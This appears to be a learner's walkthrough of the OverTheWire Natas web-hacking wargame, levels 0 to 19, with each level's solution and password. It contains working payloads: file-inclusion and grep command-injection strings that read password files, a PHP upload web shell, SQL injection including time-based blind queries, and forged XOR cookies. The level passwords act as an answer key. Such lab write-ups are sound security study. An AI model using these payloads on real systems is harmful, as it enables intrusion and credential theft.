This is the walkthrough for the Over the Wire - Natas levls

The login for the very first level is:
URL - http://natas0.natas.labs.overthewire.org
username : natas0
password : natas0

The Natas levels have a <div id=content> section which contains the actual challenge content.
The other div and header sections are unrelated to the challenge (at least in the low levels!!)


+++{ LEVEL 0 }+++
1) The password is found by opening the html inspector developer panel.
RMB > inspect element (F12 works in firefox)
The password is written in a comment in the html seen by expanding the html.

username: natas1
password:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6

+++{ LEVEL 1 }+++
1) The solution is the same as level 0 but right button click is disabled.
F12 still works, or use menu

username:natas2
password:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7

+++{ LEVEL 2 }+++
1)Open the source html browser and you'll notice a strange 1 pixel image the source of which is "files/pixel"
2)This indicates there is a directory named "files". Type this in the URL.
3) URL - http://natas2.natas.labs.overthewire.org/files - you'll discover the file "users.txt"
4) The password for natas3 is in "users.txt"

password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

+++{ LEVEL 3 }+++
1) Often web server use a file named "robots.txt" intended to stop web crawlers from indexing certain directories.
robots.txt is usually located at the root ie. /robots.txt
2) go to /robots.txt it lists a directory "Disallow:/s3cr3t/" go to the /s3cr3t/ directory.
3) there is another "users.txt" in that directory containing the password.

password:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm


+++{ LEVEL 4 }+++
1) Click the link to refresh the page a couple of times, you'll the following message:
[
 Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/"
 while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
]
2)This challeng requires a tool called "Burpsuit" or similar.
3)It is necessary to intercept the http request from the browser before it leaves our computer.
4)We need change the 'Referer Header' which is sent in the GET request.
5)The Refer Header contains the URL of the website we have come from. We have to change it to exactly the URL the challenge is asking for.
6)Change the referer header EXACTLY inlcude trailing slash and we get password

password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

+++{ LEVEL 5}+++
1) This time the challenge says:
[
 Access denied. You are not logged in.
]
2) Again with burpsuite intercept proxy - we discover a cookie with a field "loggedin=0"
3) change the value to "loggedin=1" and forward the request to get the password.

password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

+++{ LEVEL 6 }+++
1) The challenge asks for some text input into a single field form submission.
It is supposed to be the secret code to access the next level password.
2) The server side code is provided to you.
3) Examine the server side code and see the line :

    include "includes/secret.inc";

4) The 'include' directive causes the code on the specified file to be included in the php script.
You should NOT be able to navigate to this directory - this is a directory traversal flaw.
5) Navigate to the included file: /includes/secret.inc" and look in the source explorer window to find the comment telling your the secret code that goes in the input field.

password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

+++{LEVEL 7}+++
1)This seems to be another directory traversal. Check the source inspector for coments. There is a hint telling you where the password is
2)If you try just navigating to the file via putting it in url: /natas_webpass/natas8
It does not work - file is not found.
3) Notice click the hyperlinks 'home' and 'about' changes url to a page parameter.
index.pgp?page=home -or- page=about
4)instead try page=/etc/natas_webpass/natas8
5)it dumps the password

password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

+++{LEVEL 8}+++
1)Another form input. The server side is provided and gives you the encoded secret and the function which encodes
2)It is simple using php to do the reverse (decode) function.
3) Server side does this:

  $encodedSecret = "3d3d516343746d4d6d6c315669563362";

  function encodeSecret($secret) {
      return bin2hex(strrev(base64_encode($secret)));
  }

4) You need to do the reveres. PHP can be called from command line:

  php -r '$e=base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")),true); print $e;'

5) The above command will print the secret value for you: 'oubWYf2kBq'
   You need to type in to the form to get the password.

password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

+++{ LEVEL 9 }+++
1)Examine the hint code. This problem suggests that its a needle in a haystack.
2)Actually it is a command execution flaw.
3)The user input goes unverified in the grep command allowing grep across arcross arbitrary files.
 /** Server Side: **/

     passthru("grep -i $key dictionary.txt");

 /** Our input replaces '$key' in the expression on above - executed on the remote server **/

4)Also putting a star in the input will grep for all files in the current directory and dumps the hint code.
5)We alread know the password is located at /etc/natas_webpass/natas10 and we know the kind what the password looks like
6)We only need a single character to match grep to print the output.
7)We can try every individual letter until one matches, or we we can use a regular expression.

  -E [a-zA-Z] /etc/natas_webpass/natas10

8) -E [a-zA-Z] is the regular exprerssion
9) because we know the form of the password it wont require many guesses to match, so a regular expression is not essential

  password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

+++{ LEVEL 10}+++
1)This is basically the same as LEVEL 9 but include the PHP preg_match which seems to be filtering for charters we might use in a regular expression
2)Very noticably does not filter slashes or underscore so solution fom LEVEL 9 minus the regex still works.
3)Also important, quotes are not being filtered and, the input going to grep is not inside quotes

  U /etc/natas_webpass/natas11

4)Arbitrarily select single characters to grep for

  password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg


+++{ LEVEL 11 }+++
1)this problem uses xor to encrypt the cookie and there is no feed back or chaining.
2)the flaw is the use of XOR which operates byte for byte, and is reversible.
3)Given the ciphertext and the plain text the two can be XORed to produce the key.
4)We can use a php script to perform the XOR.

<?php
function get_key($plain, $crypt)
{ 
 $key=""; 
 print("Cleartext Length:".strlen($plain));
 print("\nCiphertext Length:".strlen($crypt));
 for($i=0;$i<strlen($plain);$i++){
   $key.=$plain[$i]^$crypt[$i];
  }
 return $key;
} 
$default_data=array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$encoded="MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5ofXt%2FeCgubjY";
$j=json_encode($default_data);  
$x=base64_decode($encoded);
print("\nKey=".get_key($j,$x));
?>

5) Here is the output from the script

Cleartext Length:41
Ciphertext Length:42
Key=KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLK

6)because the characters repeat it means the key is shorter than the plaintext
7)The key is: qw8J
8)We write another script to create the cookie with the injected data.

<?php
$data=json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$key="qw8J";   
$cookie=""; 
for($i=0;$i<strlen($data);$i++){
  $cookie.=$data[$i]^$key[$i%strlen($key)];
} 
print(base64_encode($cookie));
?>

9) The output of this script:

MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz

10) this value must replace that which the server sent us.
11) the cookie can be accessed and re-written in the webbrowser (firefox) in the storage tab of the dev-tools
12) finally use the webform again, our new cookie will be sent back to the server and we get the password.

password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG


+++{ LEVEL 12 }+++
1) This problem wants us to upload a small size image.
2) however it does not check that an images was uploaded, or that the file was valid.
3) The uploaded file gets displayed as a hyperlink to the file.
4) clicking on the hyperlink the browser will try to request and load the file, just like an html file
5) The following issues can be exploited:
 a> The file extention is taken directly from a hidden field on client side and used in the hyperlink displayed to the user. We can change it from jpg to php.
 b> the upladed file not sanitized - we can upload a php script that will dump the password.
 c> the php script will be executed when we click on the hyperlink to the uploaded file that is displayed to us. 
6) PHP script is as follows:
 
 <html>
 <?
 $p=passthru("cat /etc/natas_webpass/natas13");
 echo $p;
 ?>
 </html>

7) Change the filename in the hidden form to have a PHP extension.
8) Upload a PHP file containing the PHP script above.
9) click the hyper link.

 Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

+++{ LEVEL 13 }+++
1) The analyis of this level is exactly  the same as the previous with the addition of a magic number check
2) Most files have a signature set of bytes at the start of the file to identify them.
   The exif_imagetype function used on this level check the file signature.
3) We only need to insert an image file signture such as JFIF infront of our script used on the previos level.
4) Wikipedia the jfif file signature. Open our previous script in a Raw Hex editor and insert the signature at the start.
5) One valid Signature is FF D8 FF E0 00 10 4A 46 49 46 00 01
6) Upload the file and change the extension as done in level 12

Password: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP


+++{ LEVEL 14 }+++
1) This level is a basic SQL injection vulnerability
2) We have the following query string

   $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

3) User input goes directly into query with no sanitization.
4) SQL will return result when the conditions in the query evaluate to TRUE
5) because of (3) we can enter an additional SQL condition which always evaluate to TRUE
6) in the password box we type the following:
 
   " OR 1=1 #

7) quote closes the first quote in the query expression, hash is comment symbol and discards the actual closing quote, OR 1=1 is always true

Password: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

+++{ LEVEL 15}+++
1) This level has 'debug' output which can be triggered sending 'debug' as a url parameter in a get request
2) In the source inspector change the form action to GET
3) Type in the URL bar not the input box. The SQL query which is executed will be displayed.
   This is not the query itself, just the string which will be sent as query.
4) The following URL string result in:

   natas15.natas.labs.overthewire.org/index.php?username=natas16&debug=1
   SELECT * from users where username="natas16"

5) The PHP line is:

   $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";

6)This level is not actualy returning the data from the database, only that the data exists
7)we might be able to modify the debug string to create new sql query.

  a) natas15.natas.labs.overthewire.org/index.php?username=1" OR "1" -- &debug=1
  b) natas15.natas.labs.overthewire.org/index.php?username=1" OR "1"\"";// -- &debug=1
  c) http://natas15.natas.labs.overthewire.org/index.php?username="natas16" AND STRCMP("w",password)<0 -- &debug

8) above a) and b) demonstrate vulnerability to SQL injection however it doesn't give us much
9) I needed a hint from a friend here. Above c) uses the mysql function STRCMP(string1,string2)

   string1<string2 : STRCMP=-1
   string1=string2 : STRCMP=0
   string1>string2 : STRCMP=1

10) the expression STRCMP(string1,string2)<0 will evaluate to true if string1 is less than string2.
11) We can use c) in a script to repeatedly send a query.
12) Using a distance halving algorithm to search through an ordered (by char code) array of alphanum characters we can build the password 1 byte at a time.
13) Finally when you have found the full password (32chars) check it give the expected result
 
    STRCMP(mypass,password)<0
    STRCMP(mypass,password)=0
    STRCMP(mypass,password)>0
14) The second test should be the only one that returns true and will result in the server saying "This user exists". The others will give you "This user doesn't exist"
15) Keep in mind you must use the full 32 character password for this test.
16) You can also use the alternative query:

    http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20password=%22TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V%22%20--%20&debug=1

17) Oh Dear, Swapping Lowercase for uppercase also give the same result provided the numbers are not changed
18) Investigating - Apparently MySQL STRCMP() is case insensitive.
19) If like me you're not the MySQL Guru - My Friend advised the Fix is easy with keyword BINARY

    STRCMP(BINARY string1,string2)

20) NOTE:Due to the condition checking only <0, the last character we find is likely to be One(1) below the correct character. i.e. 'U' instead of 'V', or 'b' instead of 'c'
21) NOTE:I modified the script to use the python urllib library which I found is more reliable than raw sockets, However making too many requests, the server boots you off. Bit of flaw, but you can start with a partial password and continue until you have 32 chars.
22) NOTE:You must be exact about whether letters are upper or lower case, otherwise this script fails.
    The tell, if you have wrong char, is when script always finds last letter of array 'z'

    Password:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

+++{ LEVEL 16 }+++

1) Similar to level 9 and 10 but with difference
2) Quotes are being filtered and the input going to grep is inside quotes making the search term literal string - except for '$', '`', and '\', and '!' if history expansion is enabled.

http://natas16.natas.labs.overthewire.org/?needle={text}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}

3) The following characters do not get filtered: / * . _ ^ $ ( ) [ ]
4) The following types of searches are possible:
4.1) '^' and '$' match the start and end of a word
4.2) [A-Z] character class matching
4.3) '.' single character matching with period.
5) We put the characters ^.$ in the box and discover the following list of single letters with no opposite case:

	B C D E F G H I K N O P S T U V W Y a m

6)Other observations: 
6.1) Interesting search terms: ^D$ ; ^[A-Z][A-Z][A-Z]$
7) All digits 0-9 exist text equivalen e.g. one,two,three etc.
8) command substitution: $(); NOTE: Redirection <() doesn't seem to work as expected
9) Loop and increase the '-b' paramter: ^$(cut -b2 /etc/natas_webpass/natas17)$
9.1) E.G.  -b2, -b3, -b4, etc
9.2) The server will interpret: grep -i "$(cut -b1 /etc/natas_webpass/natas)" dictionary.txt

10)Better solution:
11) A better way: The True/false approach used in the previous level, this time a different indicator of true/false to indicate a letter exists or not.
12) Return value of grep are: 0 - no error, match is returned. 1 - No error, empty match is rerturn. 2 - Error
13) Download (copy paste) the diction for offline analysis and discover the word 'Mrs' has unique letter combination. i.e. grep "Mrs" returns a single result.
14) Therefore any letter or number which we append from the password file to the word 'Mrs' will not be found in the dictionary and grep will return empty match.
15) If we nest grep using command substitution:

	grep -i "$(grep ^D /etc/natas_webpass/natas17)Mrs" dictionary.txt

16) If the inside grep matches the password letters the command substitution will prepend/append 'Mrs' to become 'DMrs' - which does not exist.
17) If the inside grep does not match password letter the substitution is empty and the result is 'Mrs' which the outside grep will locate
18) Consequently we write a script with nested grep and if we get no result from the query we have a correct letter.
16) Build up the password one letter at a time like with did in the previous level

17) NOTE: the carrot '^' is required at the start of the search to anchor search to beginning of word, otherwise grep will return a match from anywhere in the word.
18) If you forget the ^ you might find the last N characters in stead of the first, the loop will continue and find nothing for the remainder.

	password: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

---{Level 17}---
1) Level 17 is nearly identical to level 15 but it does not print the output saying whether a user exists.
2) The solution in this case is the same as level 15 with the addition of the the sql SLEEP(n) seconds

	SELECT * from users where username="natas18" AND STRCMP(BINARY "mypass",password)<0 AND SLEEP(10) -- "

3) If guess 'mypass' is less than 'password' then STRCMP()<0 is True and response will take N seconds due to the SLEEP(n).
4) If guess 'mypass' is greater than 'password' the STRCMP()<0 is False and response is only 1-2 seconds.
5) In SLEEP(n), n need to be long enough to distinguish from no sleep e.g. 10 second. but not so long to hold up the server.
6) The script we used to level 15 needs to be modified to measure the response time.
7) python: import time, t=time.time() gives us seconds since epoch. Measure the time before and after sending query to get difference.

	Password:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

---{Level 18}---
1) We have to provide admin credentials to login.
2) The server sends us a cookie PHPSESSID with a random value
3) Currently we are just a user. To become the admin, we have to set the value of the session variable $_SESSION["admin"] equal to 1
4) The session variable is stored on the server and is populated from a file linked to a session ID.
5) As a client we do not have access to the $_SESSION variable so we cannot directly act on it.
6) The PHPSESSID is used to store the session id on the client in a cookie file. This cookie is editable on the client side.
7) When the browser sends the cookie with the session ID back to the server, the server looks up the session ID to find its own file which populates the $_SESSION variable.
8) This means we have to send a session ID that correspond to the data file on the server which holds the admin credentials.
9) From the supplied server code we know there are only 640 user ID's one of which is the admin session.
10) The solution is to continually request and modify the PHPSESSID value to increment each time, until we hit on the admin session id
11) This solution can be implemented manually via the browser dev tool, or by writing a script, or 'Burp Suit' is very simple to use in this regard.

12) NOTE: The key 'admin' in the $_SESSION["admin"] needs to exists which is done by putting the URL paramter username=admin

13) NOTE: Its also worth pointing out that 'session_id()' function gets the current session, or creates a new session if supplies with an argument.
   if the ID of an existing session is supplied as argument, the session will get overwritten. 
14) On the server code there appears to be a possibility of overwriting the admin session due to the use of 'rand(1,$maxid)' in the 'createID()' function. It would then be immediately set to 0 by the 'isValidAdminLogin()' function, then again in the 'my_session_start()' function.

	Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s

---{Level 19}---
1) This level is same has level 18 using a different ID
2) The PHPSESSID in the cookie is a hex number which converts to following examples

	3431342d61646d696e  414-admin
	3435372d61646d696e  457-admin
	3334342d61646d696e  344-admin
	3631352d61646d696e  615-admin

3) Assuming the code is the same as level 18 per instruction, then admin session will be a number between 1 and 640
4) we can do the same method as level 19 but convert the session number to hex as in above example.
5) Using Burp - Numerical sequence 3 digits wide the preprocess payload by append with '-admin' and encode to ascii hex

	Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
